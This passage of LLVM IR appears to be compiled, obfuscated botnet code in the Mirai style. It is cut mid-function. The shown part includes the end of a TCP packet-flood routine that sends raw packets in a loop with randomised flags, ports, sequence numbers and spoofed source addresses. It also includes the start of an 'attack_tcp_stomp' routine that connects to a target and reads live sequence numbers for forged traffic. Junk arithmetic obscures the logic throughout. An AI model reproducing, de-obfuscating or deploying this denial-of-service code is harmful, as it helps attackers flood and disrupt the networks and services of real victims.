  %308 = or i16 %305, %306
  %309 = xor i16 %307, %308
  %310 = or i16 %300, %301
  %311 = xor i16 %310, -1
  %312 = or i16 13057, %302
  %313 = and i16 %311, %312
  %314 = or i16 %309, %313
  %315 = or i16 %298, %291
  store i16 %314, i16* %281, align 4
  %316 = load i8, i8* %22, align 1
  %317 = sext i8 %316 to i16
  %318 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 4
  %320 = load i16, i16* %319, align 4
  %321 = xor i16 1, -1
  %322 = xor i16 %317, %321
  %323 = and i16 %322, %317
  %324 = and i16 %317, 1
  %325 = shl i16 %323, 11
  %326 = xor i16 %320, -1
  %327 = xor i16 -2049, -1
  %328 = xor i16 -5714, -1
  %329 = or i16 %326, %327
  %330 = or i16 -5714, %328
  %331 = xor i16 %329, -1
  %332 = and i16 %331, %330
  %333 = and i16 %320, -2049
  %334 = xor i16 %332, -1
  %335 = xor i16 %325, -1
  %336 = xor i16 13196, -1
  %337 = and i16 %334, 13196
  %338 = and i16 %332, %336
  %339 = and i16 %335, 13196
  %340 = and i16 %325, %336
  %341 = or i16 %337, %338
  %342 = or i16 %339, %340
  %343 = xor i16 %341, %342
  %344 = or i16 %334, %335
  %345 = xor i16 %344, -1
  %346 = or i16 13196, %336
  %347 = and i16 %345, %346
  %348 = or i16 %343, %347
  %349 = or i16 %332, %325
  store i16 %348, i16* %319, align 4
  %350 = load i8, i8* %23, align 1
  %351 = sext i8 %350 to i16
  %352 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %353 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %352, i32 0, i32 4
  %354 = load i16, i16* %353, align 4
  %355 = xor i16 %351, -1
  %356 = xor i16 1, -1
  %357 = xor i16 16548, -1
  %358 = or i16 %355, %356
  %359 = or i16 16548, %357
  %360 = xor i16 %358, -1
  %361 = and i16 %360, %359
  %362 = and i16 %351, 1
  %363 = shl i16 %361, 10
  %364 = xor i16 -1025, -1
  %365 = xor i16 %354, %364
  %366 = and i16 %365, %354
  %367 = and i16 %354, -1025
  %368 = xor i16 %366, -1
  %369 = xor i16 %363, -1
  %370 = xor i16 -4299, -1
  %371 = and i16 %368, -4299
  %372 = and i16 %366, %370
  %373 = and i16 %369, -4299
  %374 = and i16 %363, %370
  %375 = or i16 %371, %372
  %376 = or i16 %373, %374
  %377 = xor i16 %375, %376
  %378 = or i16 %368, %369
  %379 = xor i16 %378, -1
  %380 = or i16 -4299, %370
  %381 = and i16 %379, %380
  %382 = or i16 %377, %381
  %383 = or i16 %366, %363
  store i16 %382, i16* %353, align 4
  %384 = load i8, i8* %24, align 1
  %385 = sext i8 %384 to i16
  %386 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 4
  %388 = load i16, i16* %387, align 4
  %389 = xor i16 %385, -1
  %390 = xor i16 1, -1
  %391 = xor i16 24662, -1
  %392 = or i16 %389, %390
  %393 = or i16 24662, %391
  %394 = xor i16 %392, -1
  %395 = and i16 %394, %393
  %396 = and i16 %385, 1
  %397 = shl i16 %395, 9
  %398 = xor i16 %388, -1
  %399 = xor i16 -513, -1
  %400 = xor i16 28790, -1
  %401 = or i16 %398, %399
  %402 = or i16 28790, %400
  %403 = xor i16 %401, -1
  %404 = and i16 %403, %402
  %405 = and i16 %388, -513
  %406 = and i16 %404, %397
  %407 = xor i16 %404, %397
  %408 = or i16 %406, %407
  %409 = or i16 %404, %397
  store i16 %408, i16* %387, align 4
  %410 = load i8, i8* %25, align 1
  %411 = sext i8 %410 to i16
  %412 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 4
  %414 = load i16, i16* %413, align 4
  %415 = xor i16 %411, -1
  %416 = xor i16 1, -1
  %417 = xor i16 -21905, -1
  %418 = or i16 %415, %416
  %419 = or i16 -21905, %417
  %420 = xor i16 %418, -1
  %421 = and i16 %420, %419
  %422 = and i16 %411, 1
  %423 = shl i16 %421, 8
  %424 = xor i16 %414, -1
  %425 = xor i16 -257, -1
  %426 = xor i16 -14972, -1
  %427 = or i16 %424, %425
  %428 = or i16 -14972, %426
  %429 = xor i16 %427, -1
  %430 = and i16 %429, %428
  %431 = and i16 %414, -257
  %432 = and i16 %430, %423
  %433 = xor i16 %430, %423
  %434 = or i16 %432, %433
  %435 = or i16 %430, %423
  store i16 %434, i16* %413, align 4
  %436 = call i32 @rand_next()
  %437 = xor i32 %436, -1
  %438 = xor i32 65535, -1
  %439 = xor i32 -117822810, -1
  %440 = or i32 %437, %438
  %441 = or i32 -117822810, %439
  %442 = xor i32 %440, -1
  %443 = and i32 %442, %441
  %444 = and i32 %436, 65535
  %445 = trunc i32 %443 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 5
  store i16 %445, i16* %447, align 2
  %448 = load i8, i8* %22, align 1
  %449 = icmp ne i8 %448, 0
  br i1 %449, label %450, label %462

; <label>:450:                                    ; preds = %197
  %451 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = xor i16 -2049, -1
  %455 = xor i16 %453, %454
  %456 = and i16 %455, %453
  %457 = and i16 %453, -2049
  %458 = and i16 %456, 2048
  %459 = xor i16 %456, 2048
  %460 = or i16 %458, %459
  %461 = or i16 %456, 2048
  store i16 %460, i16* %452, align 4
  br label %462

; <label>:462:                                    ; preds = %450, %197
  %463 = load i8*, i8** %31, align 8
  %464 = load i32, i32* %26, align 4
  call void @rand_str(i8* %463, i32 %464)
  br label %465

; <label>:465:                                    ; preds = %462
  %466 = load i32, i32* %9, align 4
  %467 = sub i32 0, %466
  %468 = sub i32 0, 1
  %469 = add i32 %467, %468
  %470 = sub i32 0, %469
  %471 = add nsw i32 %466, 1
  store i32 %470, i32* %9, align 4
  br label %118

; <label>:472:                                    ; preds = %118
  br label %473

; <label>:473:                                    ; preds = %654, %472
  store i32 0, i32* %9, align 4
  br label %474

; <label>:474:                                    ; preds = %649, %473
  %475 = load i32, i32* %9, align 4
  %476 = load i8, i8* %5, align 1
  %477 = zext i8 %476 to i32
  %478 = icmp slt i32 %475, %477
  br i1 %478, label %479, label %654

; <label>:479:                                    ; preds = %474
  %480 = load i8**, i8*** %11, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds i8*, i8** %480, i64 %482
  %484 = load i8*, i8** %483, align 8
  store i8* %484, i8** %32, align 8
  %485 = load i8*, i8** %32, align 8
  %486 = bitcast i8* %485 to %struct.iphdr*
  store %struct.iphdr* %486, %struct.iphdr** %33, align 8
  %487 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i64 1
  %489 = bitcast %struct.iphdr* %488 to %struct.tcphdr*
  store %struct.tcphdr* %489, %struct.tcphdr** %34, align 8
  %490 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i64 1
  %492 = bitcast %struct.tcphdr* %491 to i8*
  store i8* %492, i8** %35, align 8
  %493 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %494 = load i32, i32* %9, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i64 %495
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i32 0, i32 2
  %498 = load i8, i8* %497, align 4
  %499 = zext i8 %498 to i32
  %500 = icmp slt i32 %499, 32
  br i1 %500, label %501, label %525

; <label>:501:                                    ; preds = %479
  %502 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %503 = load i32, i32* %9, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i64 %504
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i32 0, i32 1
  %507 = load i32, i32* %506, align 4
  %508 = call i32 @ntohl(i32 %507) #7
  %509 = call i32 @rand_next()
  %510 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %511 = load i32, i32* %9, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %510, i64 %512
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %513, i32 0, i32 2
  %515 = load i8, i8* %514, align 4
  %516 = zext i8 %515 to i32
  %517 = lshr i32 %509, %516
  %518 = sub i32 %508, 137340325
  %519 = add i32 %518, %517
  %520 = add i32 %519, 137340325
  %521 = add i32 %508, %517
  %522 = call i32 @htonl(i32 %520) #7
  %523 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 9
  store i32 %522, i32* %524, align 4
  br label %525

; <label>:525:                                    ; preds = %501, %479
  %526 = load i32, i32* %28, align 4
  %527 = icmp eq i32 %526, -1
  br i1 %527, label %528, label %532

; <label>:528:                                    ; preds = %525
  %529 = call i32 @rand_next()
  %530 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 8
  store i32 %529, i32* %531, align 4
  br label %532

; <label>:532:                                    ; preds = %528, %525
  %533 = load i16, i16* %13, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  br i1 %535, label %536, label %545

; <label>:536:                                    ; preds = %532
  %537 = call i32 @rand_next()
  %538 = xor i32 65535, -1
  %539 = xor i32 %537, %538
  %540 = and i32 %539, %537
  %541 = and i32 %537, 65535
  %542 = trunc i32 %540 to i16
  %543 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %544 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %543, i32 0, i32 3
  store i16 %542, i16* %544, align 4
  br label %545

; <label>:545:                                    ; preds = %536, %532
  %546 = load i16, i16* %16, align 2
  %547 = zext i16 %546 to i32
  %548 = icmp eq i32 %547, 65535
  br i1 %548, label %549, label %558

; <label>:549:                                    ; preds = %545
  %550 = call i32 @rand_next()
  %551 = xor i32 65535, -1
  %552 = xor i32 %550, %551
  %553 = and i32 %552, %550
  %554 = and i32 %550, 65535
  %555 = trunc i32 %553 to i16
  %556 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 0
  store i16 %555, i16* %557, align 4
  br label %558

; <label>:558:                                    ; preds = %549, %545
  %559 = load i16, i16* %17, align 2
  %560 = zext i16 %559 to i32
  %561 = icmp eq i32 %560, 65535
  br i1 %561, label %562, label %571

; <label>:562:                                    ; preds = %558
  %563 = call i32 @rand_next()
  %564 = xor i32 65535, -1
  %565 = xor i32 %563, %564
  %566 = and i32 %565, %563
  %567 = and i32 %563, 65535
  %568 = trunc i32 %566 to i16
  %569 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %570 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %569, i32 0, i32 1
  store i16 %568, i16* %570, align 2
  br label %571

; <label>:571:                                    ; preds = %562, %558
  %572 = load i32, i32* %18, align 4
  %573 = icmp eq i32 %572, 65535
  br i1 %573, label %574, label %578

; <label>:574:                                    ; preds = %571
  %575 = call i32 @rand_next()
  %576 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 2
  store i32 %575, i32* %577, align 4
  br label %578

; <label>:578:                                    ; preds = %574, %571
  %579 = load i32, i32* %19, align 4
  %580 = icmp eq i32 %579, 65535
  br i1 %580, label %581, label %585

; <label>:581:                                    ; preds = %578
  %582 = call i32 @rand_next()
  %583 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 3
  store i32 %582, i32* %584, align 4
  br label %585

; <label>:585:                                    ; preds = %581, %578
  %586 = load i8, i8* %27, align 1
  %587 = icmp ne i8 %586, 0
  br i1 %587, label %588, label %591

; <label>:588:                                    ; preds = %585
  %589 = load i8*, i8** %35, align 8
  %590 = load i32, i32* %26, align 4
  call void @rand_str(i8* %589, i32 %590)
  br label %591

; <label>:591:                                    ; preds = %588, %585
  %592 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %593 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %592, i32 0, i32 7
  store i16 0, i16* %593, align 2
  %594 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %595 = bitcast %struct.iphdr* %594 to i16*
  %596 = call zeroext i16 @checksum_generic(i16* %595, i32 20)
  %597 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 7
  store i16 %596, i16* %598, align 2
  %599 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %600 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %599, i32 0, i32 6
  store i16 0, i16* %600, align 4
  %601 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %602 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %603 = bitcast %struct.tcphdr* %602 to i8*
  %604 = load i32, i32* %26, align 4
  %605 = sext i32 %604 to i64
  %606 = sub i64 0, %605
  %607 = sub i64 20, %606
  %608 = add i64 20, %605
  %609 = trunc i64 %607 to i16
  %610 = call zeroext i16 @htons(i16 zeroext %609) #7
  %611 = load i32, i32* %26, align 4
  %612 = sext i32 %611 to i64
  %613 = sub i64 0, 20
  %614 = sub i64 0, %612
  %615 = add i64 %613, %614
  %616 = sub i64 0, %615
  %617 = add i64 20, %612
  %618 = trunc i64 %616 to i32
  %619 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %601, i8* %603, i16 zeroext %610, i32 %618)
  %620 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %621 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %620, i32 0, i32 6
  store i16 %619, i16* %621, align 4
  %622 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %623 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %622, i32 0, i32 1
  %624 = load i16, i16* %623, align 2
  %625 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %626 = load i32, i32* %9, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %625, i64 %627
  %629 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i32 0, i32 0
  %630 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %629, i32 0, i32 1
  store i16 %624, i16* %630, align 2
  %631 = load i32, i32* %10, align 4
  %632 = load i8*, i8** %32, align 8
  %633 = load i32, i32* %26, align 4
  %634 = sext i32 %633 to i64
  %635 = add i64 40, 2571235639245446544
  %636 = add i64 %635, %634
  %637 = sub i64 %636, 2571235639245446544
  %638 = add i64 40, %634
  %639 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %640 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %641 = load i32, i32* %9, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %640, i64 %642
  %644 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %643, i32 0, i32 0
  %645 = bitcast %struct.sockaddr_in* %644 to %struct.sockaddr*
  store %struct.sockaddr* %645, %struct.sockaddr** %639, align 8
  %646 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %647 = load %struct.sockaddr*, %struct.sockaddr** %646, align 8
  %648 = call i64 @sendto(i32 %631, i8* %632, i64 %637, i32 16384, %struct.sockaddr* %647, i32 16)
  br label %649

; <label>:649:                                    ; preds = %591
  %650 = load i32, i32* %9, align 4
  %651 = sub i32 0, 1
  %652 = sub i32 %650, %651
  %653 = add nsw i32 %650, 1
  store i32 %652, i32* %9, align 4
  br label %474

; <label>:654:                                    ; preds = %474
  br label %473

; <label>:655:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %860

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %860

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %723, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %729

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %718, %705, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %723

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %166

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 0, %159
  %161 = sub i32 %150, %160
  %162 = add i32 %150, %159
  %163 = call i32 @htonl(i32 %161) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  br label %175

; <label>:166:                                    ; preds = %125
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  br label %175

; <label>:175:                                    ; preds = %166, %143
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  br i1 %178, label %179, label %187

; <label>:179:                                    ; preds = %175
  %180 = call i32 @rand_next()
  %181 = xor i32 65535, -1
  %182 = xor i32 %180, %181
  %183 = and i32 %182, %180
  %184 = and i32 %180, 65535
  %185 = trunc i32 %183 to i16
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %185, i16* %186, align 2
  br label %191

; <label>:187:                                    ; preds = %175
  %188 = load i16, i16* %17, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %189, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %187, %179
  %192 = load i32, i32* %26, align 4
  %193 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %194 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %194, %struct.sockaddr** %193, align 8
  %195 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %196 = load %struct.sockaddr*, %struct.sockaddr** %195, align 8
  %197 = call i32 @connect(i32 %192, %struct.sockaddr* %196, i32 16)
  %198 = call i64 @time(i64* null) #6
  store i64 %198, i64* %31, align 8
  br label %199

; <label>:199:                                    ; preds = %721, %191
  store i32 16, i32* %29, align 4
  %200 = load i32, i32* %10, align 4
  %201 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %202 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %203 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %203, %struct.sockaddr** %202, align 8
  %204 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %205 = load %struct.sockaddr*, %struct.sockaddr** %204, align 8
  %206 = call i64 @recvfrom(i32 %200, i8* %201, i64 256, i32 16384, %struct.sockaddr* %205, i32* %29)
  %207 = trunc i64 %206 to i32
  store i32 %207, i32* %33, align 4
  %208 = load i32, i32* %33, align 4
  %209 = icmp eq i32 %208, -1
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %199
  br label %860

; <label>:211:                                    ; preds = %199
  %212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %213 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %212, i32 0, i32 0
  %214 = load i32, i32* %213, align 4
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %216 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 4
  %218 = icmp eq i32 %214, %217
  br i1 %218, label %219, label %711

; <label>:219:                                    ; preds = %211
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
